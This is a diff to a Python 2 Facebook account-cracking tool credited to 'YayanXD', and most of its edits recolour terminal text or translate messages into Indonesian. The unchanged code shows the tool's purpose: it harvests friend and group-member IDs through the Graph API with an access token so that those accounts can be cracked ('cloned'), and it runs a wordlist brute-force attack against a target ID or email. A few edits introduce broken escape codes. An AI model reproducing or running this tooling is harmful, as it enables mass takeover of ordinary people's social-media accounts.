@@ -1803,12 +1803,12 @@ def login1():
 				print"\n\x1b[1;97mThere is no internet connection"
 				keluar()
 		if 'checkpoint' in url:
-			print("\n\x1b[1;97mYour Account is on Checkpoint")
+			print("\n\x1b[1;97mSepertinya akun Anda Terkena Checkpoint")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			keluar()
 		else:
-			print("\n\x1b[1;93mPassword/Email is wrong")
+			print("\n\x1b[1;93mPassword/Email Salah")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			login()
@@ -1833,7 +1833,7 @@ def menu():
                 sub = str(b['summary']['total_count'])
 	except KeyError:
 		os.system('clear')
-		print"\033[1;97mYour Account is on Checkpoint"
+		print"\033[1;97mSepertinya akun Anda Terkena Checkpoint"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		login()
@@ -1952,17 +1952,17 @@ def pilih():
 		os.system('clear')
 		print logo6
 		print "\033[1;94m«-----------------\033[1;91mDataReset\033[1;94m---------------»"
-                jalan('\033[1;97m=10%')
-                jalan("\033[1;97m==20%")
-                jalan('\033[1;97m===30%')
-                jalan('\033[1;97m====40%')
-                jalan("\033[1;97m=====50%")
-                jalan("\033[1;97m======60%")
+                jalan('\033[1;91m=10%')
+                jalan("\033[1;92m==20%")
+                jalan('\033[1;93m===30%')
+                jalan('\033[1;94m====40%')
+                jalan("\033[1;95m=====50%")
+                jalan("\033[1;96m======60%")
                 jalan('\033[1;97m=======70%')
-                jalan('\033[1;97m========80%')
-                jalan('\033[1;97m=========90%')
-                jalan('\033[1;97m==========100%')
-                jalan('\033[1;97mCloning Data Reset')
+                jalan('\033[1;91m========80%')
+                jalan('\033[1;92m=========90%')
+                jalan('\033[1;93m==========100%')
+                jalan('\033[1;94mCloning Data Reset')
 		os.system('git pull origin master')
 		raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
 		menu()
@@ -2273,7 +2273,7 @@ def pilih_hack():
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
-			print"\033[1;91mNama\033[1;94m:\033[1;97m "+op["name"]
+			print"\033[1;95mNama\033[1;94m:\033[1;97m "+op["name"]
 		except KeyError:
 			print"\x1b[1;91mID Salah!"
 			raw_input("\n\033[1;97m[\033[1;91mKeluar\033[1;97m]")
@@ -2511,7 +2511,7 @@ def pilih_black():
 		print "\x1b[1;91mSalah Pilih Yang Benar..."
 		pilih_black()
 	
-	print "\033[1;95mTotal ID\033[1;97m: \033[1;97m"+str(len(id))
+	print "\033[1;95mTotal ID\033[1;91m: \033[1;97m"+str(len(id))
 	jalan('\033[1;95mMohon Tunggu\033[1;97m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
@@ -2702,16 +2702,16 @@ def pilih_mafia():
 		os.system('clear')
 		print logo
 		idt = raw_input("\033[1;97m[•◈•] \033[1;95mMasukan ID\033[1;91m: \033[1;97m")
-		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mYayanXD\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+		print "\033[1;94m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mYayanXD\033[1;94m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
-			print"\033[1;97mNama\033[1;97m:\033[1;97m "+op["name"]
+			print"\033[1;95mNama\033[1;91m:\033[1;97m "+op["name"]
 		except KeyError:
-			print"\x1b[1;97mID Salah!"
+			print"\x1b[1;91mID Salah!"
 			raw_input("\n\033[1;97m[\033[1;97mKeluar\033[1;97m]")
 			mafia()
-		print"\033[1;97mGetting IDs\033[1;97m..."
+		print"\033[1;95mMendapatkan ID\033[1;97m..."
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -2722,15 +2722,15 @@ def pilih_mafia():
 		print "\x1b[1;97mSalah Pilih Yang Benar..."
 		pilih_mafia()
 	
-	print "\033[1;97mTotal ID\033[1;97m: \033[1;97m"+str(len(id))
-	jalan('\033[1;97mMohon Tunggu\033[1;97m...')
+	print "\033[1;95mTotal ID\033[1;97m: \033[1;97m"+str(len(id))
+	jalan('\033[1;95mMohon Tunggu\033[1;97m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		print("\r\033[1;97mCloning\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;97m«-----\x1b[1;91m【BERHENTI TEKAN CTRL+Z】\033[1;97m----»"
 	print "\033[1;97m«--------------------\033[1;97m▣\033[1;97m------------------»"
 	jalan(' \033[1;94mMohon Tunggu Akun Kloning Akan Muncul Di Sini')
-        jalan(' \033[1;95m         Start Cloning United Bangladash ')
+        jalan(' \033[1;95m         Start Cloning Bangladash ')
 	print "\033[1;97m«--------------------\033[1;97m▣\033[1;97m------------------»"
 	
 			
@@ -2887,12 +2887,12 @@ _____¶¶¶¶¶¶¶¶¶________¶¶¶¶¶¶__________¶¶¶¶¶_______
 Jangan Khawatir ID Chekpoint Anda Akan Terbuka Setelah 7 Hari 
 
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;97m .....YAYAN XD....... \033[1;97m :
+: \033[1;94m .....YAYAN XD....... \033[1;94m :
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 Facebook
-              \033[1;97m Moch Yayan Juan Alvredo XD."""
+              \033[1;94m Moch Yayan Juan Alvredo XD."""
 	
-	raw_input("\n\033[1;97m[\033[1;97mKeluar\033[1;97m]")
+	raw_input("\n\033[1;97m[\033[1;91mKeluar\033[1;97m]")
 	crack()
 
 def test():
@@ -2907,9 +2907,9 @@ def test():
 		login()
 	os.system('clear')
 	print logo12
-	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;92mClone Daftar Teman Publik"
+	print "\033[1;97m-•◈•-\033[1;91m> \033[1;97m1.\x1b[1;92mClone Daftar Teman Publik"
         time.sleep(0.05)
-	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m0.\033[1;97mKeluar"
+	print "\033[1;97m-•◈•-\033[1;91m> \033[1;97m0.\033[1;97mKeluar"
 	pilih_test()
 
 def pilih_test():
@@ -2920,17 +2920,17 @@ def pilih_test():
 	elif peak =="1":
 		os.system('clear')
 		print logo
-		idt = raw_input("\033[1;97m[•◈•] \033[1;97mMasukan ID\033[1;97m: \033[1;97m")
-		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mYayanXD\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+		idt = raw_input("\033[1;97m[•◈•] \033[1;95mMasukan ID\033[1;97m: \033[1;97m")
+		print "\033[1;94m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mYayanXD\033[1;94m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
-			print"\033[1;97mNama\033[1;97m:\033[1;97m "+op["name"]
+			print"\033[1;95mNama\033[1;97m:\033[1;97m "+op["name"]
 		except KeyError:
-			print"\x1b[1;97mID Salah!"
-			raw_input("\n\033[1;97m[\033[1;97mKeluar\033[1;97m]")
+			print"\x1b[1;91mID Salah!"
+			raw_input("\n\033[1;97m[\033[1;91mKeluar\033[1;97m]")
 			test()
-		print"\033[1;97mMendapatkan ID\033[1;97m..."
+		print"\033[1;97m5mMendapatkan ID\033[1;97m..."
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -2941,16 +2941,16 @@ def pilih_test():
 		print "\x1b[1;97mSalah Pilih Yang Benar..."
 		pilih_test()
 	
-	print "\033[1;97mTotal ID\033[1;97m: \033[1;97m"+str(len(id))
-	jalan('\033[1;97mMohon Tunggu\033[1;97m...')
+	print "\033[1;95mTotal ID\033[1;97m: \033[1;97m"+str(len(id))
+	jalan('\033[1;95mMohon Tunggu\033[1;97m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		print("\r\033[1;97mCloning\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;97m«-----\x1b[1;91m【BERHENTI TEKAN CTRL+Z】\033[1;97m----»"
-	print "\033[1;97m«--------------------\033[1;97m▣\033[1;97m------------------»"
-	jalan(' \033[1;97mMohon Tunggu Akun Kloning Akan Muncul Di Sini')
-        jalan(' \033[1;97m         Start Cloning Appear Here')
-	print "\033[1;97m«--------------------\033[1;97m▣\033[1;97m------------------»"
+	print "\033[1;97m«--------------------\033[1;91m▣\033[1;97m------------------»"
+	jalan(' \033[1;95mMohon Tunggu Akun Kloning Akan Muncul Di Sini')
+        jalan(' \033[1;94m                     Tools by YayanXD')
+	print "\033[1;97m«--------------------\033[1;91m▣\033[1;97m------------------»"
 	
 			
 	def main(arg):
@@ -3106,12 +3106,12 @@ ________________$$$$__________________$$$$
 Jangan Khawatir ID Chekpoint Anda Akan Terbuka Setelah 7 Hari 
 
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;97m .....YAYAN XD....... \033[1;97m :
+: \033[1;94m .....YAYAN XD....... \033[1;97m :
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 Facebook
-              \033[1;97m Moch Yayan Juan Alvredo XD."""
+              \033[1;94m Moch Yayan Juan Alvredo XD."""
 	
-	raw_input("\n\033[1;97m[\033[1;97mKeluar\033[1;97m]")
+	raw_input("\n\033[1;97m[\033[1;91mKeluar\033[1;97m]")
 	crack()
           
 def super():
@@ -3126,9 +3126,9 @@ def super():
 		login()
 	os.system('clear')
 	print logo13
-	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;93mClone Daftar Teman Publik"
+	print "\033[1;97m-•◈•-\033[1;91m> \033[1;94m1.\x1b[1;93mClone Daftar Teman Publik"
         time.sleep(0.05)
-	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m0.\033[1;97mKeluar"
+	print "\033[1;97m-•◈•-\033[1;91m> \033[1;97m0.\033[1;97mKeluar"
 	pilih_super()
 
 def pilih_super():
@@ -3139,17 +3139,17 @@ def pilih_super():
 	elif peak =="1":
 		os.system('clear')
 		print logo
-		uty = raw_input("\033[1;97m[•◈•] \033[1;97mMasukan ID\033[1;97m: \033[1;97m")
-		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mYayanXD\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+		uty = raw_input("\033[1;97m[•◈•] \033[1;95mMasukan ID\033[1;91m: \033[1;97m")
+		print "\033[1;94m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mYayanXD\033[1;94m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 		try:
 			kk = requests.get("https://graph.facebook.com/"+uty+"?access_token="+toket)
 			hh = json.loads(kk.text)
-			print"\033[1;97mNama\033[1;97m:\033[1;97m "+hh["name"]
+			print"\033[1;95mNama\033[1;97m:\033[1;97m "+hh["name"]
 		except KeyError:
-			print"\x1b[1;97mID Salah!"
+			print"\x1b[1;91mID Salah!"
 			raw_input("\n\033[1;97m[\033[1;97mKeluar\033[1;97m]")
 			super()
-		print"\033[1;97mMendapatkan ID\033[1;97m..."
+		print"\033[1;95mMendapatkan ID\033[1;97m..."
 		v = requests.get("https://graph.facebook.com/"+uty+"/friends?access_token="+toket)
 		f = json.loads(v.text)
 		for e in f['data']:
@@ -3160,15 +3160,15 @@ def pilih_super():
 		print "\x1b[1;97mSalah Pilih Yang Benar..."
 		pilih_super()
 	
-	print "\033[1;97mTotal ID\033[1;97m: \033[1;97m"+str(len(id))
-	jalan('\033[1;97mMohon Tunggu\033[1;97m...')
+	print "\033[1;95mTotal ID\033[1;97m: \033[1;97m"+str(len(id))
+	jalan('\033[1;95mMohon Tunggu\033[1;97m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		print("\r\033[1;97mCloning\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;97m«-----\x1b[1;91m【BERHENTI TEKAN CTRL+Z】\033[1;97m----»"
 	print "\033[1;97m«--------------------\033[1;97m▣\033[1;97m------------------»"
-	jalan(' \033[1;97mMohon Tunggu Akun Kloning Akan Muncul Di Sini')
-        jalan(' \033[1;97m         Start Cloning Indian ')
+	jalan(' \033[1;94mMohon Tunggu Akun Kloning Akan Muncul Di Sini')
+        jalan(' \033[1;91m         Start Cloning Indian ')
 	print "\033[1;97m«--------------------\033[1;97m▣\033[1;97m------------------»"
 	
 			
@@ -3318,12 +3318,12 @@ def pilih_super():
 Jangan Khawatir ID Chekpoint Anda Akan Terbuka Setelah 7 Hari 
 
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;97m .....YAYAN XD....... \033[1;97m :
+: \033[1;94m .....YAYAN XD....... \033[1;97m :
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 Facebook
-              \033[1;97m Moch Yayan Juan Alvredo XD."""
+              \033[1;94m Moch Yayan Juan Alvredo XD."""
 	
-	raw_input("\n\033[1;97m[\033[1;97mKeluar\033[1;97m]")
+	raw_input("\n\033[1;97m[\033[1;91mKeluar\033[1;97m]")
 	crack()
 
 def clone_dari_member_group():
@@ -3358,7 +3358,7 @@ def clone_dari_member_group():
 	teman = requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
 	kimak = json.loads(teman.text)
 	jalan('\033[1;97m[✺] \033[1;97mStart \033[1;97m...')
-	print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
+	print('\x1b[1;96m[!] \x1b[1;93mBerhenti Tekan CTRL+z')
 	print 42*"\033[1;97m="
 	for w in kimak['data']:
 		jml +=1
@@ -3412,13 +3412,13 @@ def brute():
     else:
         os.system('clear')
         print logo14
-        print '\033[1;97m ◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.'
+        print '\033[1;94m ◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.'
         try:
             email = raw_input('\x1b[1;91m[●] \x1b[1;92mID\x1b[1;97m/\x1b[1;91mEmail \x1b[1;92mTarget \x1b[1;91m:\x1b[1;96m ')
             passw = raw_input('\x1b[1;91m[●] \x1b[1;92mWordlist \x1b[1;97m(Type Yayan.txt) \x1b[1;91m: \x1b[1;97m')
             total = open(passw, 'r')
             total = total.readlines()
-            print '\033[1;97m ◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.'
+            print '\033[1;94m ◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.'
             print '\x1b[1;93m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mTarget \x1b[1;91m:\x1b[1;97m ' + email
             time.sleep(0.05)
             print '\x1b[1;93m[+] \x1b[1;93mTotal\x1b[1;94m ' + str(len(total)) + ' \x1b[1;92mPassword'
@@ -3526,9 +3526,9 @@ def phone():
 		login()
 	os.system('clear')
 	print logo15
-	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;92mClone Daftar Teman Publk indian Old."
+	print "\033[1;97m-•◈•-\033[1;91m> \033[1;97m1.\x1b[1;92mClone Daftar Teman Publk indian Old."
         time.sleep(0.05)
-	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m0.\033[1;97mKeluar"
+	print "\033[1;97m-•◈•-\033[1;971m> \033[1;97m0.\033[1;97mKeluar"
 	pilih_phone()
 
 def pilih_phone():
@@ -3539,17 +3539,17 @@ def pilih_phone():
 	elif peak =="1":
 		os.system('clear')
 		print logo
-		idt = raw_input("\033[1;97m[•◈•] \033[1;97mMasukan ID\033[1;97m: \033[1;97m")
-		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mYayanXD\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+		idt = raw_input("\033[1;97m[•◈•] \033[1;95mMasukan ID\033[1;91m: \033[1;97m")
+		print "\033[1;94m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mYayanXD\033[1;94m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
 			print"\033[1;97mNama\033[1;97m:\033[1;97m "+op["name"]
 		except KeyError:
-			print"\x1b[1;97mID Salah!"
-			raw_input("\n\033[1;97m[\033[1;97mKeluar\033[1;97m]")
+			print"\x1b[1;91mID Salah!"
+			raw_input("\n\033[1;97m[\033[1;91mKeluar\033[1;97m]")
 			phone()
-		print"\033[1;97mMendapatkan ID\033[1;97m..."
+		print"\033[1;95mMendapatkan ID\033[1;97m..."
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
